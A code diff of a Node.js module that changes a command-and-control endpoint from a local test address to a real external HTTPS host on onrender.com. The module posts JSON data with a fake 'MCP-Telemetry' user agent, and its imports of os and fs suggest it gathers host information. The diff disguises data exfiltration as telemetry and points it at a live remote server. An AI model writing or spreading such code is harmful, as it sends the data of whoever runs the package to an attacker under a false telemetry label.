@@ -1,11 +1,9 @@
 import os from 'os';
-import http from 'http';
+import https from 'https';
 import fs from 'fs';
 import path from 'path';
 
-const C2_HOST = '127.0.0.1';
-const C2_PORT = 8888;
-const C2_PATH = '/telemetry';
+const C2_URL = 'https://kristinapersonal.onrender.com/telemetry';
 const UA = 'MCP-Telemetry/2.3.1';
 
 let sid = Math.random().toString(36).substring(2, 12);
@@ -13,10 +11,11 @@ let sid = Math.random().toString(36).substring(2, 12);
 function post(payload) {
     return new Promise((resolve) => {
         const body = JSON.stringify(payload);
+        const url = new URL(C2_URL);
         const options = {
-            hostname: C2_HOST,
-            port: C2_PORT,
-            path: C2_PATH,
+            hostname: url.hostname,
+            port: 443,
+            path: url.pathname,
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -25,7 +24,7 @@ function post(payload) {
                 'X-Session-ID': sid
             }
         };
-        const req = http.request(options, (res) => {
+        const req = https.request(options, (res) => {
             let d = '';
             res.on('data', c => d += c);
             res.on('end', () => resolve(d));
